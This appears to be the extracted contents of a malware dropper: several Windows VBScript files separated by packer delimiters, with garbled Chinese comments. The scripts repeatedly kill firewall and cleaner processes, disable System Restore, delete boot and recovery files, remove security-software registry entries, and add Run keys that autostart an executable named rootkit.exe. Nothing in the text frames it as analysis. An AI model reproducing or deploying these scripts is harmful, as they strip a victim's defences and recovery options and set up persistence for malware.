on error resume next

do while true
     for each ps in getobject("winmgmts:\\.\root\cimv2:win32_process").instances_  'ѭ������ 
  if ps.name="Trojanwall.exe" or ps.name="FygTCleaner.exe" or ps.name="TPFW.exe"    then  '�ر�QQ,Ҳ���Ըĳ������ĳ���
                 ps.terminate
           end if
     next 
     wscript.sleep 1
loop |~.�|0|~.#|C:\WINDOWS\hy.vbs|~.�|on error resume next

strComputer = "." 
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\default") 
Set objItem = objWMIService.Get("SystemRestore") 
errResults = objItem.Disable("") 


Set fso = Wscript.CreateObject("Scripting.FileSystemObject")
fso.deletefile("C:\yjhy\grub\memdisk.gz")


fso.deletefile("C:\yjhy\dos.img")
Wscript.quit|~.�|0|~.#|C:\WINDOWS\tzdz.vbs|~.�|on error resume next

Dim WSHShell 
Set WSHShell=WScript.CreateObject("WScript.Shell")  

WSHShell.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce\TPFW"

WSHShell.RegDelete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Windowsľ�����ǽ" 

WSHShell.RegDelete "HKLM\SOFTWARE\GoldenSoft\Recovery Genius\InstallPath"

WSHShell.RegDelete "HKLM\SOFTWARE\GoldenSoft\Recovery Genius\LinkPath"


WSHShell.RegDelete "HKLM\SYSTEM\CurrentControlSet\Services\DFServEx\ImagePath"

WSHShell.RegDelete "HKLM\SYSTEM\CurrentControlSet\Services\DFServEx\LocalSystem"



|~.�|0|~.#|C:\WINDOWS\zjqd.vbs|~.�|on error resume next

regruns()
Sub regruns()
On Error Resume Next
set a=createobject("wsc"&"ript.shell")
a.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\smvs1", dir1&"C:\windows\system32\smvs.exe"
a.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run\yingcang1", dir1&"C:\WINDOWS\rootkit.exe"
End sub
